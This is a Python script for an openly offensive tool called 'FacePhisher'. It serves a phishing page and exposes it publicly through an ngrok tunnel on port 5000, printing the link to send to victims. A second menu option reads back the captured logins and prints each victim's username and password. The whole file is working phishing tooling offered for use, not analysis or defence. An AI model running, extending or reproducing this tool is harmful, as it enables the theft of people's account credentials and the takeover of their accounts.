from include import Template
from config import System
from pyngrok import ngrok
from flask import *
import os, time, re
import logging

def GetUrlNgrok():
    https_tunnel = ngrok.connect(5000, 'http')
    tunnel_view = ngrok.get_tunnels()
    Nlink = str(tunnel_view[0])
    r = re.findall(r'https.*\.ngrok\.io', Nlink)
    return r

def cursor():
    r = input(str('\033[0;33m[\033[0;34mFacePhisher\033[0;33m]\033[0;m:'))
    return r

def main():
    content = '''\033[0;34m
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
██░▄▄▄█░▄▄▀█▀▄▀█░▄▄██░▄▄░█░█████▄██░▄▄█░████░▄▄█░▄▄▀
██░▄▄██░▀▀░█░█▀█░▄▄██░▀▀░█░▄▄░██░▄█▄▄▀█░▄▄░█░▄▄█░▀▀▄
██░████▄██▄██▄██▄▄▄██░████▄██▄█▄▄▄█▄▄▄█▄██▄█▄▄▄█▄█▄▄
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
  \033[0;m
                   \033[0;33m[\033[0;34m01\033[0;33m]\033[0;32mPlay Phisher
                   \033[0;33m[\033[0;34m02\033[0;33m]\033[0;32mLoad Data
                   \033[0;33m[\033[0;31m00\033[0;33m]\033[0;31mExit
    \033[0;m
    '''
    os.system('clear')
    print (content)
    r = cursor()
    if r == '01' or r == '1':
        System.playpage()
        linkNgrok = GetUrlNgrok()
        print ('Link:', linkNgrok[0])
        Template.page()
    elif r == '02' or r == '2':
        System.playpage()
        id = System.getdata()
        lg, sh = Template.read(id)
        print ("Usuario: ",lg,'\nSenha: ',sh)
    elif r == '00' or r == '0':
        os.system('clear')
        print (System.content)
    else:
        os.system('clear')
        print (System.content)
        print (f'Comando {r} Invalido')
        System.reboot()
        



if __name__ == '__main__':
       main()